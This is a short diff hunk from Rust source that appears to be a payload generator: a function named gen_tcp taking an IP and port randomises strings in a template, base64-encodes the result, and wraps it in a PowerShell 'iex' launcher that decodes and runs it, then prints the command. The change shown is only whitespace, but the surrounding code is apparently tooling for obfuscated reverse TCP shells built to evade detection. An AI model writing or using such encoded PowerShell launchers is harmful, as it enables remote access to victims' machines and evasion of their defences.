@@ -81,8 +81,7 @@ pub fn gen_tcp(ip:&str, port:&str){
     let teste = execute_filtro.replace_all(&teste,generate(tamanho));
    
 
-   let teste = encode64(teste.to_string());
-    
+    let teste = encode64(teste.to_string()); 
     let teste = r"iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('".to_string()+&teste +"')))";
     
     println!("{}",teste);
